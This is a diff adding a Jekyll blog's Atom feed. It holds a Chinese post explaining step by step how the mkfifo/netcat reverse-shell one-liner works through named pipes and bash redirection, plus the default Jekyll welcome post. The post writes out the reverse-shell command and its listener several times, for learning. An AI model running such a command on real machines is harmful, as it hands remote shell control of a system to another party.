@@ -1,0 +1,90 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-03-21T12:05:46+08:00</updated><id>/feed.xml</id><title type="html">MP4Four’s blog</title><subtitle>Code and die</subtitle><entry><title type="html">对于nc反弹shell的一些疑惑</title><link href="/2021/03/21/nc-related-issues.html" rel="alternate" type="text/html" title="对于nc反弹shell的一些疑惑" /><published>2021-03-21T11:13:57+08:00</published><updated>2021-03-21T11:13:57+08:00</updated><id>/2021/03/21/nc-related-issues</id><content type="html" xml:base="/2021/03/21/nc-related-issues.html">&lt;h3 id=&quot;一次平平无常的nc反弹shell操作如下&quot;&gt;一次平平无常的nc反弹shell操作如下&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;attack machine:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$nc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; port &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;victim machine:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f | /bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1 | nc ip port &amp;amp;&amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;等价于&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;/bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1 &amp;lt;/tmp/f | nc ip port &amp;amp;&amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;之前看到这个方式知道可以连接，但仍存在一些疑惑，主要是对匿名管道和管道的工作方式不太理解，以为cat会进行阻塞，那么后面的命令便一直在等待，但其实发现并不是。&lt;/p&gt;
+
+&lt;h3 id=&quot;匿名管道不会进行阻塞&quot;&gt;匿名管道不会进行阻塞&lt;/h3&gt;
+
+&lt;p&gt;这里所说的阻塞是加入前一个命令因为I/O请求阻塞了，后一个命令依然会继续执行，不会等待前一个命令的输出才运行。看下面这个简单例子&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; /tmp/f | &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;xxx&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;（省略了mkfifo这一步骤）由于/tmp/f初始为空，所以cat会进入阻塞状态，等待来自管道的数据，而后面的echo “xxx”并并没有因此收到影响，而是直接执行，因此terminal会输出一个xxx，同时cat仍然在等待着管道f填充数据&lt;/p&gt;
+
+&lt;h3 id=&quot;尝试和bash联动&quot;&gt;尝试和bash联动&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; /tmp/f | &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;which bash&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;此命令执行完后没有输出，但并不意味着什么也没发生，当前termial已经新开了一个bash，并且等待着从管道f读取命令&lt;/p&gt;
+
+&lt;p&gt;新开一个terminal（tab or window皆可），叫它termial2吧（前一个就叫terminal1），在&lt;strong&gt;terminal2&lt;/strong&gt;输入&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;date -u&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;则terminal1输出此命令和此命令的结果&lt;/p&gt;
+
+&lt;p&gt;这里发现在&lt;strong&gt;读取一次输入后自动就exit了&lt;/strong&gt;，但是我们的nc反弹shell并不会执行一次命令就gg。这是因为terminal1这条命令的意思就是“&lt;strong&gt;从管道里读入数据，将数据作为bash的输入命令，然后输出bash执行结果至stdout，程序结束&lt;/strong&gt;”，没有后续的输入输出，按照逻辑程序自然就结束了。&lt;/p&gt;
+
+&lt;p&gt;接下来尝试了下面这个命令 (&lt;strong&gt;terminal1&lt;/strong&gt;)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; /tmp/f | &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;which bash&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &amp;amp;&amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;terminal2&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pwd&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;结果发现terminal1没有任何输出，在&lt;strong&gt;terminal2&lt;/strong&gt;里尝试读取一下管道里的信息&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; /tmp/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;满屏幕不断滚动，基本逻辑就是“&lt;strong&gt;从管道f里读入数据，bash解释执行此数据，然后将结果重定向至管道f&lt;/strong&gt;”，此时管道f里数据不为空，cat接着输出，cat有输出就意味着bash又有输入，于是发现程序并没有退出逻辑，所以周而复始，就死循环了。除了第一个是pwd的正常输出外，其余基本都是错误输出（当然了，pwd的输出很难成为一个有效命令）。&lt;/p&gt;
+
+&lt;p&gt;此时再回顾下面命令&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$cat&lt;/span&gt; /tmp/f | /bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1 | nc ip port &amp;amp;&amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;即使初始管道为空，这条命令执行后也会立即和attack machine建立nc连接，此时在attack machine输入命令，回车，命令通过tcp连接发送给victim machine的nc，nc输出被重定向至f管道，然后cat从f管道将命令读出来，传递给bash作为输入，bash执行此条命令后将结果输出传递给nc，nc将结果返回给attack machine，就达成了远程获取shell的成就！&lt;/p&gt;
+
+&lt;h3 id=&quot;画了一幅图大概长这样&quot;&gt;画了一幅图，大概长这样&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/nc-mechanism.png&quot; alt=&quot;nc-mechanism&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如有错误，欢迎指出&lt;/p&gt;</content><author><name>MP4Four</name></author><summary type="html">一次平平无常的nc反弹shell操作如下</summary></entry><entry><title type="html">Welcome to Jekyll!</title><link href="/jekyll/update/2021/03/21/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2021-03-21T11:13:57+08:00</published><updated>2021-03-21T11:13:57+08:00</updated><id>/jekyll/update/2021/03/21/welcome-to-jekyll</id><content type="html" xml:base="/jekyll/update/2021/03/21/welcome-to-jekyll.html">&lt;p&gt;You’ll find this post in your &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;
+
+&lt;p&gt;Jekyll requires blog post files to be named according to the following format:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR-MONTH-DAY-title.MARKUP&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YEAR&lt;/code&gt; is a four-digit number, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MONTH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DAY&lt;/code&gt; are both two-digit numbers, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MARKUP&lt;/code&gt; is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;
+
+&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html">You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.</summary></entry></feed>
